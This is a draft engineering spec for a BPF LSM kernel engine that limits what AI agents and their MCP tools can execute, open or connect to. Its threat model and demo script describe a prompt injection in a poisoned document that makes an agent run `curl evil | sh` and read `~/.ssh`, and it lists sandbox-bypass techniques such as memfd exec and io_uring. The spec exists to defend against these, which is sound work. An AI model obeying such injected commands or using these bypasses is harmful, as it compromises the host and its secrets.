# AgentKernelShield (AKS): Product and Engineering Spec

Status: Draft v1 | Date: 2026-09-30 | Author: [your name] | License: see section 20

## 0. Summary

AKS is a Linux security engine for AI agents. It ties an agent's identity (a cgroup) to kernel-level enforcement (BPF LSM), and switches the kernel policy when the agent calls a different MCP tool.

One line: **make MCP tool hints enforceable in the kernel.**

Why now: MCP tool annotations (`readOnlyHint`, `openWorldHint`, ...) are advisory. The spec treats them as untrusted, and mislabeled tools are common. Nothing enforces them. AKS does.

Contents: 1 Problem | 2 Goals | 3 Non-goals | 4 Users and stories | 5 Requirements | 6 Prior art | 7 Tech stack | 8 Architecture | 9 Interfaces | 10 Decisions (ADRs) | 11 Workflow | 12 User flow | 13 Security | 14 Testing | 15 Release | 16 Runbook | 17 Tech debt | 18 Risks | 19 Plan and metrics | 20 Repo, license, git rules | 21 Resources | 22 Glossary

---

## 1. Problem statement

Autonomous agents run tools: shells, file access, network calls. A prompt injection in a document, web page or tool result can make the agent run `curl evil | sh`, read `~/.ssh`, or exfiltrate data.

Current defenses:

- **LLM checks LLM.** Probabilistic, slow, bypassable by the same injection.
- **App-level allowlists.** Live inside the process the attacker controls.
- **Static sandboxes** (containers, seccomp profiles). Deterministic, but one policy for the whole run. They can't say "this tool may read, that tool may write."
- **MCP annotations.** Useful vocabulary, zero enforcement.

Cost of not solving it: an agent with shell access is one injected string from host compromise.

Evidence and pitch angle: annotation-mismatch findings in surveys of public MCP servers (see section 21).

## 2. Goals

| ID | Goal | Measure (targets, verify by test) |
|---|---|---|
| G1 | Deterministic in-kernel enforcement of exec, file open and outbound connect for one agent cgroup | 100% of the in-scope bypass suite (section 14) denied |
| G2 | Tool-scoped policy: profile follows the MCP tool being called | Switch acked before the tool starts; ack under 10 ms local |
| G3 | Fails closed | Daemon crash or kill leaves last policy enforcing (pinned links) |
| G4 | Low overhead | Exec-latency and syscall-latency deltas measured and published; target under 5% on the bench workload |
| G5 | Reproducible | Fresh Ubuntu VM to first blocked `curl` in under 30 minutes using the README |
| G6 | Explainable | Every deny event says which hook, which profile, which target |
| G7 | Portfolio-grade | CI green, threat model, prior-art section, benchmark, 3-minute demo recording |

## 3. Non-goals (v1)

| Non-goal | Why out |
|---|---|
| Defending against root or a compromised kernel | Out of reach for any LSM. Documented in the threat model. |
| Detecting or classifying prompt injection | AKS limits damage, it does not judge text. |
| Using an LLM anywhere in the decision path | Determinism is the point. |
| Full container or VM isolation | Use containers for that. AKS can run inside one. |
| Windows and macOS | Different kernels. Linux only. |
| Multi-tenant SaaS, Kubernetes operator | Premature. Parked. |
| Content inspection (DLP) of allowed traffic | AKS gates destinations, not payloads. |
| Letting untrusted MCP annotations widen access | Annotations may only narrow a human-written policy. |
| Web dashboard | Terminal UI and JSONL log are enough. |

## 4. Users and stories

Personas:

- **Agent developer** (primary): builds agents with LangChain, custom loops or MCP clients. Wants safe defaults without a container per run.
- **Security engineer**: reviews what an agent may do. Wants a readable policy and an audit log.
- **Hackathon judge / recruiter**: wants a working demo and clear engineering choices.

Stories (ordered by priority):

1. As an agent developer, I want to launch my agent under a policy with one command so that unsafe actions are blocked without code changes.
2. As an agent developer, I want each MCP tool to run under its own profile so that a read-only tool cannot write or connect out.
3. As a security engineer, I want a human-written YAML policy to be the only authority so that tool metadata cannot grant access.
4. As a security engineer, I want every allow-exception and deny logged with hook, profile and target so that I can audit a run.
5. As an agent developer, I want a live terminal view of blocks so that I can tune the policy while the agent runs.
6. As an agent developer, I want unknown tools to get the most restrictive profile so that new tools are safe by default.
7. As an operator, I want a one-command kill switch and a documented recovery path so that a bad policy cannot brick the host.

## 5. Requirements

### P0: cannot ship without

| ID | Requirement | Acceptance (Given / When / Then) |
|---|---|---|
| FR-1 | `aks run -- <cmd>` creates a cgroup v2, moves the child in, applies policy | Given a valid policy, when I run the agent, then all its descendants share the cgroup id |
| FR-2 | LSM `bprm_check_security`: deny exec of binaries not in the profile's allow set (matched by device + inode) | Given `curl` not allowed, when the agent runs it, then exec returns EPERM and an event is logged |
| FR-3 | LSM `file_open`: deny opens with write intent when profile fs mode is `read_only`; deny opens of inodes in `deny_files` | Given read_only, when a tool opens a file for write, then EPERM |
| FR-4 | LSM `socket_connect`: deny connects not in the profile's `ip:port` set | Given no net rule, when the agent connects to 1.2.3.4:443, then EPERM |
| FR-5 | Policy is YAML, validated before load; invalid policy is rejected with line and reason | Given a typo'd key, when I run `aks policy check`, then non-zero exit and a message |
| FR-6 | Tool profiles: `enter_tool` / `exit_tool` over a Unix socket; daemon acks after the map update is visible | Given profile switch acked, when the tool runs, then rules of that profile apply |
| FR-7 | Switch state is tied to the socket connection; connection loss reverts to baseline | Given middleware crash mid-tool, then policy reverts within 1 s |
| FR-8 | Unknown tool name gets the `restricted` profile (baseline exec and net, fs read_only) | Given tool `x` not in policy, when entered, then restricted applies |
| FR-9 | Ring buffer events to userspace; logging never blocks enforcement | Given ring buffer full, then deny still happens and a drop counter increments |
| FR-10 | Programs, links and maps pinned in bpffs so enforcement survives daemon exit | Given `kill -9 aksd`, when the agent runs `curl`, then still denied |
| FR-11 | Honor the previous LSM verdict: never turn a deny from another LSM into allow | Given a prior non-zero return, then AKS returns it |
| FR-12 | `aks status`, `aks stop --release` (detach and unpin), `aks tui` | Given release, then no AKS programs remain attached |
| FR-13 | Python middleware wraps tool calls: enter, run, exit in `finally` | Given tool raises, then exit still sent |
| FR-14 | Baseline profile: policy always allows what the agent runtime needs (interpreter, libs, LLM API endpoint) | Given baseline, then the demo agent runs 30 minutes with no false denies |

### P1: fast follow

| ID | Requirement |
|---|---|
| FR-20 | Path-prefix rules in `file_open` via `bpf_d_path` and an LPM trie (verify hook allows the helper) |
| FR-21 | `file_permission` hook so a profile switch also applies to already-open fds |
| FR-22 | LSM `bpf` hook: deny `bpf()` syscalls from the agent cgroup. `ptrace_access_check` and `task_kill`: protect the daemon |
| FR-23 | `aks learn`: audit-only run that drafts a profile from observed behavior |
| FR-24 | Annotation compiler: MCP `readOnlyHint` / `openWorldHint` produce a draft narrowing rule, never widening |
| FR-25 | Authenticated switch channel: only the middleware process may call `enter_tool` |
| FR-26 | UDP and DNS control (`socket_sendmsg`), resolver pinning |
| FR-27 | Minimal capability set for the daemon (verify what load and attach need) |

### P2: design for, do not build

Hash-chained audit log, Kubernetes DaemonSet, Landlock fallback for non-root hosts, per-tool child cgroups for concurrent tool calls, policy signing.

---

## 6. Prior art and differentiation

| Project | What it does | Gap AKS fills |
|---|---|---|
| Aks (Bappaditya-kuilya) | Kernel-level behavioral profiles for agent processes, BPF LSM, process-tree tracking. Go + C | Static profile per agent. No tool-scoped switching. |
| AgentSight (eunomia-bpf) | Observability: links prompts, model calls and tool decisions to system effects. Rust, MIT | Observes, does not enforce. |
| ebpfguard (Deepfence) | Rust + Aya policy-to-LSM mapping | Archived (Feb 2026). Generic, not agent-aware. |
| Container sandboxes, seccomp | Static isolation | One policy per run. |

AKS position: **tool-scoped, MCP-driven kernel policy**, human-authored, fail-closed. README must credit Aks and AgentSight and state this difference in the first screen.

## 7. Tech stack (all free)

| Layer | Choice | Notes |
|---|---|---|
| Host | Ubuntu 24.04 LTS VM, kernel with `CONFIG_BPF_LSM=y`, BTF, boot param `lsm=<existing>,bpf` | Snapshot the VM before editing GRUB. Keep a GRUB entry without `lsm=bpf` for recovery. |
| Kernel side | Rust `no_std`, crate `aya-ebpf` (not the old `aya-bpf`), `#[lsm(hook = "...")]` | Kernel objects need a GPL-compatible license string. Keep the template's dual MIT/GPL setting. |
| Userspace | Rust stable, `aya`, `aya-log`, `tokio`, `clap`, `serde` + `serde_yaml`, `anyhow`, `tracing`, `ratatui`, `crossterm` | |
| Build | nightly with `rust-src`, `bpf-linker`, `cargo-generate`, `bindgen-cli`, `aya-tool` (kernel struct bindings) | Follow the Aya book prerequisites. |
| Middleware | Python 3.11+, official `mcp` SDK, stdlib `socket` + `json` | About 60 lines. No extra deps. |
| Demo agent | Small Python loop with two MCP tools (`read_docs`, `write_report`) and a poisoned document | Runs without a paid API by stubbing the model, or with any API key you own. |
| Test | `cargo test`, `pytest`, bash bypass scripts, `hyperfine` for latency | |
| Quality | `clippy`, `rustfmt`, `cargo-deny`, `cargo-audit`, `shellcheck` | |
| CI | GitHub Actions: build, lint, unit, audit. Integration and bypass suites run in your VM | GitHub-hosted runners do not enable BPF LSM (open runner-images issue, Sept 2026). |
| Demo capture | `asciinema` | |
| Release | GitHub Releases, `cargo-cyclonedx` SBOM, checksums | |

## 8. Architecture

```
aks run --policy p.yaml -- python agent.py
  |  creates cgroup v2 /sys/fs/cgroup/aks/<agent>, moves child in, applies baseline
  v
+---------------------------+   unix socket (JSON lines)   +-------------------------+
| Agent + MCP client        | ---- enter_tool / exit_tool ->| aksd (Rust, tokio, root)|
| + aks_client middleware   | <--------- ack(epoch) --------|  - policy compiler      |
+-------------+-------------+                               |  - map writer           |
              | syscalls                                    |  - ringbuf reader       |
              v                                             +-----------+-------------+
+--------------------------------------------------------+              | map updates
| KERNEL: BPF LSM programs (pinned in bpffs)             | <------------+
|  bprm_check_security | file_open | socket_connect      |
|  lookup: CGROUP_STATE[cgroup_id] -> {profile, epoch}   |
|  then:   EXEC_ALLOW / NET_ALLOW / FILE_DENY / FS_MODE  |
|  verdict: 0 allow | -EPERM deny  (honor prior verdict) |
+--------------------------+-----------------------------+
                           | events (ring buffer)
                           v
                 aksd -> TUI + JSONL audit log
```

### 8.1 Components

| Component | Responsibility | Trust |
|---|---|---|
| `aks-ebpf` | Enforcement. Reads maps, returns verdicts, emits events | Kernel-verified |
| `aksd` | Policy validation and compile, map writes, socket server, event fan-out | Root, trusted |
| `aks` CLI | run, policy check, status, tui, stop | Root for load, user for check |
| `aks_client` (Python) | Wraps tool calls with enter/exit | Trusted framework code |
| Policy YAML | Human authority for what is allowed | Trusted input |
| Agent + LLM output + tool results | Runs under the policy | **Untrusted** |

### 8.2 BPF maps

| Map | Type | Key | Value |
|---|---|---|---|
| `CGROUP_STATE` | Hash | cgroup_id (u64) | {profile_id u32, epoch u32, flags u32} |
| `EXEC_ALLOW` | Hash | {profile_id, dev, ino} | 1 |
| `NET_ALLOW` | Hash | {profile_id, family, addr, port} | 1 |
| `FILE_DENY` | Hash | {profile_id, dev, ino} | 1 |
| `FS_MODE` | Array | profile_id | 0 read_write, 1 read_only |
| `EVENTS` | Ring buffer | - | event struct |
| `COUNTERS` | Per-CPU array | {hook, verdict} | u64 (also drop count) |

Binary identity is (device, inode), resolved in userspace at load. Not path strings.

### 8.3 Hooks

| Hook | Purpose | Phase |
|---|---|---|
| `bprm_check_security` | exec allowlist | P0 |
| `file_open` | write-intent deny, inode denylist | P0 |
| `socket_connect` | outbound allowlist | P0 |
| `file_permission` | apply switches to open fds | P1 |
| `bpf`, `ptrace_access_check`, `task_kill` | protect enforcement and daemon | P1 |
| `socket_sendmsg` | UDP/DNS | P1 |

Why LSM and not tracepoints: tracepoints only observe. LSM hooks can deny, see the resolved object, and avoid the time-of-check/time-of-use race on user-space path pointers.

### 8.4 Runtime sequence

1. `aks run` validates policy, resolves paths to inodes and hostnames to IPs, creates cgroup, writes maps, then execs the agent inside the cgroup.
2. Agent starts under baseline profile.
3. Middleware calls `enter_tool(name)`. Daemon picks the profile (unknown gets `restricted`), writes `CGROUP_STATE` with a new epoch, replies `ack(epoch)`.
4. Tool runs. Hooks read `CGROUP_STATE`, decide, emit events on deny.
5. Middleware calls `exit_tool`. Daemon reverts to baseline. Connection close also reverts.
6. TUI and JSONL show events with profile and epoch.

Concurrency v1: one tool at a time per agent. Overlapping `enter_tool` returns `busy`.

## 9. Interfaces

### 9.1 Policy schema (v1)

```yaml
version: 1
name: research-bot
default: deny
baseline:                      # always in force
  exec: [/usr/bin/python3]
  net: ["api.example-llm.com:443"]   # hostnames resolved to IPs at load
  fs: read_write
  deny_files: [~/.ssh, ~/.aws, .env] # expanded to inodes at load
tools:
  read_docs:
    fs: read_only
    net: []                    # baseline net only
  write_report:
    fs: read_write
    exec: []
restricted:                    # profile for unknown tools
  fs: read_only
```

Effective set for a tool = baseline exec/net + the tool's additions. The tool's `fs` mode wins. `deny_files` always applies. A profile can never grant more than the YAML says.

### 9.2 Socket protocol (JSON lines, `/run/aks/aks.sock`)

```
-> {"op":"enter_tool","tool":"read_docs","call_id":"c1"}
<- {"ok":true,"profile":"read_docs","epoch":42}
-> {"op":"exit_tool","call_id":"c1"}
<- {"ok":true,"profile":"baseline","epoch":43}
<- {"ok":false,"error":"busy"}
```

Socket mode 0660, group `aks`. Daemon checks `SO_PEERCRED` and that the peer's cgroup is a registered agent cgroup.

### 9.3 Event record

```
{ts_ns, cgroup_id, pid, tgid, uid, comm[16], hook, verdict, profile_id, epoch, target[256]}
```

JSONL form adds the profile name and the resolved target (path or ip:port).

### 9.4 CLI

```
aks run --policy <file> -- <cmd...>
aks policy check <file>
aks status
aks tui
aks stop --release
aks learn -- <cmd...>        # P1
```

## 10. Decisions (ADR summary)

| # | Decision | Chosen | Rejected | Consequence |
|---|---|---|---|---|
| 1 | Enforcement hook | BPF LSM | tracepoint + kill, seccomp | Needs `lsm=bpf` and a reboot |
| 2 | Agent identity | cgroup v2 via `aks run` | PID registration | Needs root; no PID races |
| 3 | Decision point | In-kernel maps | Userspace verdict per event | Rules must be map-expressible |
| 4 | Binary match | (dev, inode) | Path strings | Replaced binaries need re-resolve |
| 5 | Language | Rust + Aya | Go + C | Fewer examples; translate from Aks ideas |
| 6 | Policy authority | Human YAML; hints narrow only | Trust MCP hints | Some manual config |
| 7 | Middleware link | Unix socket, sync ack | HTTP, shared memory | Local only |
| 8 | Fail mode | Fail closed, pinned links | Detach on exit | Needs explicit `stop --release` |
| 9 | Switch state | Tied to connection | Timer lease | Simple; crash reverts fast |

Format for new ADRs: Status, Date, Context, Decision, Options, Trade-offs, Consequences, Actions. Store in `docs/adr/NNNN-title.md`.

---

## 11. Workflow

### 11.1 Dev workflow

1. Trunk-based. Short branches off `main`, squash merge.
2. Conventional Commits (`feat:`, `fix:`, `docs:`, `test:`, `chore:`).
3. Local: `cargo fmt`, `cargo clippy -D warnings`, `cargo test`, then bypass suite in the VM.
4. PR template: what, why, how tested, security impact, kernel versions tried.
5. CI required to merge: build, fmt, clippy, unit tests, `cargo deny`, `cargo audit`, commit-message check (section 20.3).
6. Integration and bypass suites: run in the VM before every merge to `main`. Paste the summary in the PR.
7. Tag `vX.Y.Z` to release (section 15).

### 11.2 Branch and review rules

- `main` protected. No force-push. Signed tags for releases.
- Every kernel-side change needs: a verifier-pass log, a deny test, an allow test.
- Security-relevant PRs get a second look with this checklist: injection paths, auth on socket, privilege, fail-open paths, secrets in logs, unsafe blocks.

### 11.3 Code review checklist (Rust and BPF)

- Security: unchecked input from socket or YAML, path traversal in policy paths, secrets in events, fail-open branches.
- Correctness: every BPF branch returns a verdict, prior LSM verdict honored, ring buffer reserve failure handled, bounded loops.
- Performance: no unbounded work in hooks, map lookups only, no allocations in userspace hot loop.
- Maintainability: shared structs live in `aks-common`, no duplicated constants, comments explain why not what.

## 12. User flow

### 12.1 Main flow (agent developer)

1. Install: prerequisites, enable `lsm=bpf`, reboot, `aks --version`.
2. Write `policy.yaml` (start from `policies/examples/`).
3. `aks policy check policy.yaml`. Fix errors.
4. `aks run --policy policy.yaml -- python agent.py`.
5. Agent works. Middleware wraps each tool call.
6. `aks tui` in a second terminal: allowed profile switches and denies stream live.
7. A deny appears (hook, profile, target). Decide: intended block or policy gap.
8. Edit YAML, rerun. (P1: `aks learn` drafts rules.)
9. Done: `aks stop --release` removes programs.

### 12.2 Failure paths

| Situation | What user sees | Recovery |
|---|---|---|
| `bpf` not in `/sys/kernel/security/lsm` | `aks run` refuses with the GRUB fix | Edit GRUB, reboot |
| Agent fails at start | Deny event for its own runtime file or binary | Add to baseline, rerun |
| Unknown tool blocked | Event shows profile `restricted` | Add tool to YAML |
| Daemon down | Enforcement continues, `aks status` says daemon down | Restart `aksd` |
| Bad policy | Load rejected, old policy stays | Fix and reload |
| Host locked up by policy | Reboot with recovery GRUB entry | See runbook |

### 12.3 Demo script (3 minutes)

1. 0:00 State the problem in one sentence. Show the poisoned document.
2. 0:20 `aks run` starts the agent. TUI open on the right.
3. 0:40 Agent reads the doc, injection says `curl evil.sh | sh`. Kernel denies. Red line in TUI.
4. 1:15 Agent calls `read_docs`: write attempt denied (profile `read_docs`, read_only).
5. 1:45 Agent calls `write_report`: write allowed, same run, no restart.
6. 2:15 `kill -9 aksd`. Retry `curl`: still denied. Fail-closed proof.
7. 2:40 Show benchmark number and the prior-art slide (credit Aks, AgentSight).

## 13. Security

### 13.1 Assets and actors

- Assets: host files (keys, tokens, source), network position, the enforcement itself.
- Actors: prompt injector (via documents, web, tool output), malicious or mislabeled MCP server, curious local user, the agent itself acting on bad instructions.

### 13.2 Trust boundaries

Trusted: kernel, `aksd`, policy YAML, agent framework and middleware code.
Untrusted: LLM output, tool results, documents, web content, MCP server processes and their annotations.

### 13.3 Threats and mitigations

| # | Threat | Mitigation | Residual |
|---|---|---|---|
| T1 | Injected command spawns shell or `curl` | `bprm_check_security` allowlist | Allowed interpreters can still do allowed things |
| T2 | Exfil via network | `socket_connect` allowlist | DNS tunnel over allowed resolver; exfil to an allowed endpoint (P1: UDP/DNS control) |
| T3 | Read secrets (`~/.ssh`) | `deny_files` expanded to inodes | Files created after load not covered until P1 prefix rules |
| T4 | Write when tool is read-only | `file_open` write-intent deny | Fds opened before a switch stay writable until `file_permission` (P1) |
| T5 | Agent escapes cgroup | Agent runs non-root; cgroup owned by root | Misconfigured delegation |
| T6 | Agent detaches or edits AKS (bpf syscall, bpffs, ptrace, kill) | Non-root, no `CAP_BPF`; P1 `bpf`, `ptrace`, `task_kill` hooks | v1 relies on non-root only |
| T7 | Compromised agent calls `enter_tool` to pick a looser profile | Profiles limited to those in YAML; switch audited; P1 authenticated channel | Attacker gets the loosest declared profile |
| T8 | Mislabeled MCP annotation widens access | Annotations never widen | None by design |
| T9 | Bypass via `memfd_create` + `fexecve`, shebang, symlink, hardlink, bind mount | LSM sees the resolved file | Verify each in the bypass suite |
| T10 | `io_uring` ops skip syscall filters | LSM hooks sit on kernel objects | Verify with an io_uring test |
| T11 | Daemon crash opens the gate | Pinned links and maps | `stop --release` is deliberate |
| T12 | Event log leaks secrets | Log path/ip only, never env or file content | Paths can be sensitive: restrict log file mode 0600 |
| T13 | Malicious dependency | `cargo-deny`, `cargo-audit`, `Cargo.lock` committed, minimal deps | Transitive risk |
| T14 | Policy tampering on disk | Policy file owned by root, mode 0640 | Root compromise out of scope |

### 13.4 Hardening checklist

- Agent runs as an unprivileged user with `no_new_privs`.
- `aksd` runs as root in v1 under a systemd unit with `ProtectSystem=strict`. Drop to the minimum capabilities in P1 after testing what load and attach need.
- Socket dir `/run/aks` mode 0750.
- Userspace crates use `#![forbid(unsafe_code)]` where possible. Unsafe only around FFI, each use commented.
- No network calls from AKS itself. No telemetry.
- No secrets in repo, env dumps or logs. `.env` in `.gitignore`.
- Return conventions: 0 allow, negative errno deny, never panic in a hook.
- Vulnerability reports: `SECURITY.md` with contact and 90-day disclosure.

### 13.5 Privacy

Local only. No data leaves the host. Logs stay on disk with restrictive permissions.

## 14. Testing strategy

Pyramid: many unit, some integration, focused bypass and race tests, one benchmark.

| Layer | What | Tool | Where it runs |
|---|---|---|---|
| Unit | Policy parse and validate, YAML to map entries, inode/host resolution, protocol framing, state machine (enter/exit/busy/revert) | `cargo test`, `pytest` | CI + local |
| Integration | Real hooks in a VM: exec deny/allow, write deny, connect deny, tool switch, revert on disconnect, pinned survival after `kill -9` | bash + `pytest` | VM |
| Bypass suite | memfd exec, shebang script, symlink, hardlink, bind mount, `execveat`, io_uring connect, unix socket connect, `python -c` spawn, `bash -c`, fork storm | bash + small C/Rust helpers | VM |
| Race | Switch during fork storm; rapid enter/exit loop; two overlapping `enter_tool` | scripts | VM |
| Fuzz | YAML parser and socket protocol | `cargo fuzz` (P1) | local |
| Performance | Exec and open/connect latency with and without hooks; `bpf_stats` for hook cost | `hyperfine`, `kernel.bpf_stats_enabled` | VM |
| Compatibility | Ubuntu 24.04 (current kernel) plus one other kernel | manual matrix | VM |
| Soak | Demo agent 30 minutes, zero false denies on baseline | script | VM |

Coverage targets: 90% on policy compiler and state machine; every hook has at least one allow and one deny test; every threat T1 to T11 maps to a test or a documented gap.

Skip: trivial getters, generated bindings, framework code.

## 15. Release and deploy checklist

Pre-release:

- [ ] CI green (build, fmt, clippy, unit, deny, audit)
- [ ] Integration + bypass + race suites pass in VM, logs attached
- [ ] Benchmark rerun, numbers in README updated
- [ ] Verifier passes on target kernels
- [ ] CHANGELOG updated
- [ ] Docs match behavior (README quick start tested on a fresh VM)
- [ ] Rollback note written: previous tag, `stop --release`, unpin steps
- [ ] `git log` clean of banned attribution (section 20.3)

Release:

- [ ] Tag `vX.Y.Z` (signed), build release binary with embedded eBPF object
- [ ] Attach binary, SHA256 sums, SBOM
- [ ] Smoke test on clean VM: install, `aks run`, blocked `curl`

Post-release:

- [ ] Watch issues 48 hours
- [ ] Close related tickets, note known gaps

Rollback triggers: any false-deny that bricks the demo agent; any bypass in the in-scope suite; verifier reject on a supported kernel.

## 16. Runbook and incident response

### 16.1 Failure modes

| Symptom | Likely cause | Action |
|---|---|---|
| `aks run` says BPF LSM inactive | `lsm=bpf` missing | Fix GRUB, reboot, check `/proc/cmdline` |
| Program load fails after kernel update | Verifier or BTF change | Rebuild, run verifier log, pin kernel until fixed |
| Agent dies at start | Default deny hit runtime file or binary | Read deny event, add to baseline |
| Everything denied | Wrong cgroup or empty profile | `aks status`, check `CGROUP_STATE` |
| No events but denies happen | Ring buffer full or reader dead | Check `COUNTERS` drop count, restart `aksd` |
| Daemon crashed | Bug | Enforcement continues; restart `aksd`; file issue with log |
| Host unusable | Policy applied to wrong cgroup | Boot recovery GRUB entry (no `lsm=bpf`), remove pins in `/sys/fs/bpf/aks` |

### 16.2 Kill switch

1. `sudo aks stop --release`
2. If that fails: `sudo rm -rf /sys/fs/bpf/aks` and kill the agent.
3. Last resort: reboot into the recovery GRUB entry.

### 16.3 Severity

| Level | Example for AKS |
|---|---|
| SEV1 | Bypass of in-scope enforcement; host bricked by a release |
| SEV2 | False denies break the demo agent; verifier rejects on a supported kernel |
| SEV3 | Events missing, TUI glitch |
| SEV4 | Docs or cosmetic |

Postmortems are blameless: timeline, root cause (5 whys), what went well, what went poorly, action items with owner and date. Template in `docs/postmortem.md`.

## 17. Tech debt register (accepted shortcuts)

Priority = (Impact + Risk) x (6 - Effort). Pay highest first.

| Debt | I | R | E | Score | Plan |
|---|---|---|---|---|---|
| Hostnames stored as an IP snapshot | 3 | 3 | 2 | 24 | Refresh on timer, or resolver pinning (FR-26) |
| Single distro and kernel target | 2 | 3 | 2 | 20 | Add a second kernel to the matrix |
| Enforcement tests only in a VM | 3 | 3 | 3 | 18 | Nested VM (QEMU) job for CI |
| Sequential tool calls only | 4 | 4 | 4 | 16 | Per-tool child cgroups (P2) |
| File rules: write-bit and inode denylist only | 4 | 3 | 4 | 14 | LPM-trie path prefixes (FR-20) |
| Bypass surface documented, not fully solved | 4 | 5 | 5 | 9 | Grow the bypass suite each release |

## 18. Risks and open questions

| Risk / question | Impact | Owner | Resolve by |
|---|---|---|---|
| Default deny bricks the agent runtime | High | Dev | Baseline profile + soak test (FR-14) |
| `bprm_check_security` receives the prior verdict as an argument; confirm the Aya arg index | Med | Dev | Day 0 spike |
| Pinned link survival with Aya after process exit | High | Dev | Day 0 spike |
| Which capabilities load and attach need (for FR-27) | Med | Dev | P1 |
| `bpf_d_path` allowed in `file_open` for prefix rules | Med | Dev | P1 spike |
| Tool code in-process could call `enter_tool` itself | Med | Dev | FR-25 |
| Overlapping tool calls in async agents | Med | Dev | Serialize in middleware v1 |
| Fds opened before a profile switch stay writable | Med | Dev | FR-21 |
| Kernel or BTF change breaks load | Med | Dev | Compat matrix |

## 19. Plan and metrics

### 19.1 Milestones

| When | Deliverable |
|---|---|
| Day 0 (30 min) | VM up, `bpf` in LSM list, one LSM program denies `curl` for one cgroup, pinned link survives `kill -9`, prior-verdict arg confirmed |
| Day 1 | `aks run` launcher, cgroup scoping, exec deny by inode |
| Day 2 | YAML to maps, `file_open` and `socket_connect`, ring buffer events. **Tested core done** |
| Day 3 | Tool switching over socket, Python middleware, demo agent, poisoned doc |
| Day 4 | Log stream or TUI, bypass suite, README (prior art, threat model, limits), recording |
| Week 2 | P1: path prefixes, `file_permission`, `bpf`/`ptrace` hooks, learn mode |
| Week 3 | P1: annotation compiler, authenticated channel, fuzzing, second kernel |

Cut order if time runs out: TUI polish, then learn mode, then annotation compiler. Never cut: tests for deny paths, threat model, prior-art credit.

### 19.2 Success metrics

Leading (days):

- Demo runs end to end from a clean VM: yes/no
- In-scope bypass suite denied: 100%
- False denies in 30-minute soak: 0
- Time to first block for a new user following README: under 30 minutes

Lagging (weeks):

- CI green on `main`, README benchmark published
- Recorded demo and one write-up posted
- External feedback: issues or reviews from at least 3 people

## 20. Repo, license, git rules

### 20.1 Layout

```
aks/
  aks-ebpf/            kernel programs (no_std)
  aks-common/          shared structs and constants
  aks/                 daemon + CLI (Rust)
  middleware/python/   aks_client
  policies/examples/
  tests/{unit,integration,bypass,race,bench}/
  docs/{adr,postmortem.md,threat-model.md}
  .githooks/commit-msg
  .github/workflows/ci.yml
  README.md  SECURITY.md  CHANGELOG.md  LICENSE
```

### 20.2 License

Userspace and middleware: MIT or Apache-2.0 (pick one, state it in `LICENSE`). Kernel objects: keep the template's dual MIT/GPL license string so GPL-only helpers load. Confirm against the template before release.

### 20.3 Contributor and attribution rule (mandatory)

**No AI tool is ever listed as author, co-author or contributor.** This covers commits, `Co-authored-by` and `Signed-off-by` trailers, README credits, `CONTRIBUTORS`, `AUTHORS`, `LICENSE` headers, file headers, docs, release notes and PR descriptions. Credits go to the human authors and to real prior-art projects only.

Enforce it three ways:

1. Turn off commit and PR attribution in your coding tools' settings.
2. Local hook `.githooks/commit-msg` (enable with `git config core.hooksPath .githooks`). It rejects a message if any line matches, case-insensitively:
   - `co-authored-by:` or `signed-off-by:` followed by a line containing `claude` or `anthropic`
   - a `noreply@anthropic.com` address
   - a "generated with ... claude" style footer
3. CI job on every PR: scan `git log origin/main..HEAD --format=%B` and the diff of `README`, `CONTRIBUTORS`, `AUTHORS`, `LICENSE` with the same patterns, fail on any hit.

If one slips in: rewrite the commit message (`git rebase -i` with reword, or `git filter-repo --message-callback` for history) before pushing. After pushing, force-rewriting shared history needs a team decision.

### 20.4 README outline

1. One-line pitch and 10-second GIF
2. Why (problem, annotations are advisory)
3. Prior art and what is different (credit Aks, AgentSight)
4. Quick start (under 30 minutes, VM steps, GRUB step, verify)
5. Policy reference
6. Demo
7. Threat model and limits
8. Benchmarks
9. Roadmap
10. Contributing and security policy

## 21. Resources

- Aya book, LSM chapter and aya-tool chapter: aya-rs.dev/book
- aya-ebpf `#[lsm]` macro docs (docs.rs/aya-ebpf-macros)
- aya-template: github.com/aya-rs/aya-template
- Aks: github.com/Bappaditya-kuilya/aks (closest prior art)
- AgentSight: github.com/eunomia-bpf/agentsight
- ebpfguard (archived): github.com/deepfence/ebpfguard, prerequisites doc has a GRUB helper
- Learning eBPF (Liz Rice), free from Isovalent; Isovalent eBPF labs; ebpf.io/resources
- MCP tool annotations: spec plus Stacklok "tool annotations as risk vocabulary" and bex.co "annotations are not enforcement"
- BPF LSM enablement on runners: actions/runner-images issue 14783

## 22. Glossary

- **eBPF**: sandboxed programs that run in the Linux kernel.
- **LSM**: Linux Security Modules, hooks where the kernel asks "allowed?".
- **BPF LSM**: LSM hooks implemented with eBPF programs (kernel 5.7+).
- **cgroup v2**: kernel process grouping; AKS uses its id as agent identity.
- **BPF map**: kernel key-value store shared with userspace.
- **Ring buffer**: fast kernel-to-userspace event channel.
- **MCP**: Model Context Protocol, how agents call tools.
- **Annotation**: optional tool metadata (`readOnlyHint`, `openWorldHint`, ...). Advisory only.
- **Epoch**: counter bumped on every profile switch; ties events to a policy state.
- **Fail closed**: on failure, keep denying.
